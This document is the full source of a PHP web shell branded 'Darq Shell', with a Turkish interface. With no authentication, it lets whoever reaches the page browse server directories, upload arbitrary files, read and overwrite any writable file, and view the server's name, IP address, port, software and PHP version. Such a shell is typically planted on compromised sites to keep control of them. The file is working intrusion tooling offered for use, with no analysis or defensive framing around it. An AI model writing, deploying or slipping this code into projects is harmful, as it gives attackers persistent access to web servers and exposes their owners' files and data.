<?php
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = realpath($current_dir) ?: getcwd();


$current_dir = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;


if (isset($_FILES['file_to_upload'])) {
    $target_file = $current_dir . basename($_FILES['file_to_upload']['name']);
    if (move_uploaded_file($_FILES['file_to_upload']['tmp_name'], $target_file)) {
        header("Location: ?dir=" . urlencode($current_dir) . "&msg=upload_ok");
        exit;
    } else {
        $upload_error = "Dosya yüklenemedi. Dizinde yazma izni olmayabilir.";
    }
}


if (isset($_POST['save_file']) && isset($_POST['file_path'])) {
    $file_path = $_POST['file_path'];
    $file_content = $_POST['file_content'];
    if (strpos(realpath($file_path), realpath(dirname($file_path)) . DIRECTORY_SEPARATOR) !== 0) {
        $save_error = "Geçersiz dosya yolu.";
    } elseif (is_writable($file_path) && file_put_contents($file_path, $file_content) !== false) {
        header("Location: ?dir=" . urlencode(dirname($file_path) . DIRECTORY_SEPARATOR) . "&edit_file=" . urlencode(basename($file_path)) . "&msg=save_ok");
        exit;
    } else {
        $save_error = "Dosya kaydedilemedi. Dosya yazılabilir olmayabilir.";
    }
}

$file_to_edit = null;
if (isset($_GET['edit_file'])) {
    $file_to_edit_path = $current_dir . $_GET['edit_file'];
    if (strpos(realpath($file_to_edit_path), realpath($current_dir)) !== 0) {
        $dir_error = "Geçersiz dosya adı veya yolu.";
    } elseif (is_file($file_to_edit_path)) {
        $file_to_edit = [
            'name' => $_GET['edit_file'],
            'path' => $file_to_edit_path,
            'content' => file_get_contents($file_to_edit_path)
        ];
    } else {
        $dir_error = "Düzenlenecek dosya bulunamadı veya bir dizin.";
    }
}


$files = [];
try {
    $items = scandir($current_dir);
    foreach ($items as $item) {
        if ($item == '.') continue;
        $path = $current_dir . $item;
        $files[] = [
            'name' => $item,
            'is_dir' => is_dir($path),
            'size' => is_file($path) ? filesize($path) : '-',
            'modified' => filemtime($path) ? date('Y-m-d H:i:s', filemtime($path)) : '-'
        ];
    }
} catch (Exception $e) {
    $dir_error = "Dizin okunamadı: " . htmlspecialchars($e->getMessage());
}

function getServerInfo() {
    $info = [];
    $info['Sunucu Adı'] = $_SERVER['SERVER_NAME'] ?? 'Bilinmiyor';
    $info['IP Adresi'] = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
    $info['Port'] = $_SERVER['SERVER_PORT'] ?? 'Bilinmiyor';
    $info['Sunucu Yazılımı'] = $_SERVER['SERVER_SOFTWARE'] ?? 'Bilinmiyor';
    $info['PHP Sürümü'] = phpversion() ?? 'Bilinmiyor';
    $info['Çalışma Dizini'] = getcwd() ?? 'Bilinmiyor';
    return $info;
}
$server_info = getServerInfo();

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Darq Shell</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Julius+Sans+One&display=swap" rel="stylesheet"> 

    <style>
        
        body {
            background-color: #000000;
            color: #C0C0C0; 
            font-family: 'monospace', monospace; 
            margin: 0;
            padding: 20px;
        }

        
        h1 {
            color: #a200ffff; 
            text-align: center;
            font-size: 4em;
            margin-bottom: 30px;
            text-shadow: 0 0 5px #a200ffff, 0 0 10px #a200ffff, 0 0 20px #9501ffff, 0 0 40px #9501ffff;
            font-family: 'Julius Sans One', sans-serif; 
            font-weight: bold;
            letter-spacing: 5px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            border: 1px solid #a200ffff;
            padding: 20px;
            box-shadow: 0 0 15px #a200ffff inset, 0 0 20px #a200ffff;
        }

        .message {
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid;
            text-align: center;
            font-weight: bold;
            animation: fadeinout 4s;
        }
        .success { border-color: #a200ffff; color: #a200ffff; }
        .error { border-color: #FF0000; color: #FF0000; }
        @keyframes fadeinout {
            0%, 100% { opacity: 0; }
            10%, 90% { opacity: 1; }
        }

        .upload-area {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .custom-file-upload {
            border: 2px solid #a200ffff;
            display: inline-block;
            padding: 6px 12px;
            cursor: pointer;
            background-color: #1a0833;
            color: #C0C0C0;
            transition: all 0.3s;
            box-shadow: 0 0 5px #a200ffff;
        }
        .custom-file-upload:hover {
            background-color: #3e0e7a;
            box-shadow: 0 0 10px #9370DB;
        }
        .custom-file-upload input[type="file"] {
            display: none;
        }
        
        .upload-button {
            background-color: #a200ffff;
            color: #000000;
            border: none;
            padding: 8px 15px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 0 5px #a200ffff;
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        .upload-button:hover {
            background-color: #9370DB;
            box-shadow: 0 0 15px #9370DB;
        }

        .current-path {
            color: #9370DB;
            margin-bottom: 15px;
            font-size: 1.2em;
            padding: 5px;
            border-bottom: 1px dashed #a200ffff;
        }
        
        .file-list-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        .file-list-table th, .file-list-table td {
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #222;
        }
        .file-list-table th {
            background-color: #111;
            color: #9370DB;
        }
        .file-list-table tr:hover {
            background-color: #0f0f0f;
        }
        
        .file-name-link {
            color: #C0C0C0;
            text-decoration: none;
            transition: color 0.2s;
            display: block;
        }
        .file-name-link:hover {
            color: #9370DB;
            text-shadow: 0 0 5px #9370DB;
        }
        
        .folder-link {
            color: #a200ffff;
            font-weight: bold;
        }
        .parent-dir-link {
            color: #FFD700; 
            font-weight: bold;
        }


        #edit-area {
            padding-top: 20px;
            border-top: 1px solid #a200ffff;
            margin-top: 20px;
        }
        #edit-area h3 {
             color: #9370DB; 
             text-shadow: 0 0 5px #9370DB;
        }
        textarea {
            width: 100%;
            height: 400px;
            background-color: #0A0A0A;
            color: #00FF00; 
            border: 2px solid #a200ffff;
            padding: 10px;
            box-sizing: border-box;
            font-family: monospace;
            font-size: 0.9em;
            margin-bottom: 10px;
            box-shadow: 0 0 10px rgba(106, 13, 173, 0.5) inset;
        }
        .save-button {
            background-color: #00FF00;
            color: #000000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            box-shadow: 0 0 5px #00FF00;
            transition: background-color 0.3s, box-shadow 0.3s;
        }
        .save-button:hover {
            background-color: #32CD32;
            box-shadow: 0 0 15px #32CD32;
        }

        /* Sunucu Bilgi Alanı */
        .server-info-box {
            margin-top: 30px;
            border: 2px solid #9370DB;
            padding: 15px;
            background-color: #08001a;
            box-shadow: 0 0 10px #9370DB;
        }
        .server-info-box h3 {
            color: #9370DB;
            margin-top: 0;
            text-shadow: 0 0 5px #9370DB;
        }
        .server-info-box p {
            margin: 5px 0;
        }
        .info-label {
            color: #a200ffff;
            font-weight: bold;
            display: inline-block;
            width: 150px;
        }

    </style>
</head>
<body>

<div class="container">
    <h1>Darq Shell</h1>

    <?php 
    if (isset($_GET['msg'])) {
        $msg_class = '';
        $msg_text = '';
        if ($_GET['msg'] == 'upload_ok') {
            $msg_class = 'success';
            $msg_text = 'Dosya başarıyla yüklendi ve sayfa yenilendi.';
        } elseif ($_GET['msg'] == 'save_ok') {
            $msg_class = 'success';
            $msg_text = 'Dosya başarıyla kaydedildi ve sayfa yenilendi.';
        }
        echo "<div class='message $msg_class'>$msg_text</div>";
    }
    if (isset($upload_error)) {
        echo "<div class='message error'>$upload_error</div>";
    }
    if (isset($save_error)) {
        echo "<div class='message error'>$save_error</div>";
    }
    if (isset($dir_error)) {
        echo "<div class='message error'>$dir_error</div>";
    }
    ?>

<form class="upload-area" method="POST" enctype="multipart/form-data" action="?dir=<?php echo urlencode($current_dir); ?>">
   
    <label for="file-input" class="custom-file-upload">
        Dosya Seç...
    </label>
    
    
    <input id="file-input" type="file" name="file_to_upload" required style="display: none;" />
    
    <button type="submit" class="upload-button">Yükle</button>
    
    <span id="file-chosen">Henüz dosya seçilmedi.</span>
</form>


    <div class="current-path">
        Şu anki Dizin: **<?php echo htmlspecialchars($current_dir); ?>**
    </div>

    <table class="file-list-table">
        <thead>
            <tr>
                <th>Ad</th>
                <th>Boyut</th>
                <th>Son Düzenleme</th>
            </tr>
        </thead>
        <tbody>
            <?php 
           
            $parent_dir = dirname($current_dir);
            if ($parent_dir !== $current_dir && realpath($parent_dir) !== realpath($current_dir)) { 
                $parent_url = "?dir=" . urlencode($parent_dir . DIRECTORY_SEPARATOR);
                echo "<tr><td><a href='{$parent_url}' class='file-name-link parent-dir-link'>..</a></td><td>-</td><td>-</td></tr>";
            }

            
            foreach ($files as $file) {
                $file_name = htmlspecialchars($file['name']);
                
                if ($file['is_dir']) {
                     
                    $url = "?dir=" . urlencode($current_dir . $file['name']);
                    $class = 'folder-link';
                    $size = 'Dizin';
                } else {
                   
                    $url = "?dir=" . urlencode($current_dir) . "&edit_file=" . urlencode($file['name']);
                    $class = '';
                    $size = $file['size'] > 0 ? round($file['size'] / 1024, 2) . ' KB' : '0 KB';
                }
                
                echo "<tr>";
                echo "<td><a href='{$url}' class='file-name-link {$class}'>{$file_name}</a></td>";
                echo "<td>{$size}</td>";
                echo "<td>{$file['modified']}</td>";
                echo "</tr>";
            }
            ?>
        </tbody>
    </table>

    <?php if ($file_to_edit): ?>
    <div id="edit-area">
        <h3>Dosya Düzenle: **<?php echo htmlspecialchars($file_to_edit['name']); ?>**</h3>
        <form method="POST" action="?dir=<?php echo urlencode(dirname($file_to_edit['path']) . DIRECTORY_SEPARATOR); ?>">
            <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file_to_edit['path']); ?>">
            <textarea name="file_content" spellcheck="false"><?php echo htmlspecialchars($file_to_edit['content']); ?></textarea>
            <button type="submit" name="save_file" class="save-button">Kaydet</button>
            <a href="?dir=<?php echo urlencode(dirname($file_to_edit['path']) . DIRECTORY_SEPARATOR); ?>" class="save-button" style="background-color: #FF0000; margin-left: 10px;">İptal</a>
        </form>
    </div>
    <?php endif; ?>
    <div class="server-info-box">
        <h3>Sunucu Bilgisi</h3>
        <?php foreach ($server_info as $label => $value): ?>
            <p><span class="info-label"><?php echo htmlspecialchars($label); ?>:</span> <?php echo htmlspecialchars($value); ?></p>
        <?php endforeach; ?>
    </div>

</div>

<script>
    
    const fileInput = document.getElementById('file-input');
    const fileChosen = document.getElementById('file-chosen');
    fileInput.addEventListener('change', function() {
        if (this.files.length > 0) {
            fileChosen.textContent = 'Seçilen Dosya: ' + this.files[0].name;
        } else {
            fileChosen.textContent = 'Henüz dosya seçilmedi.';
        }
    });
</script>

</body>
</html>
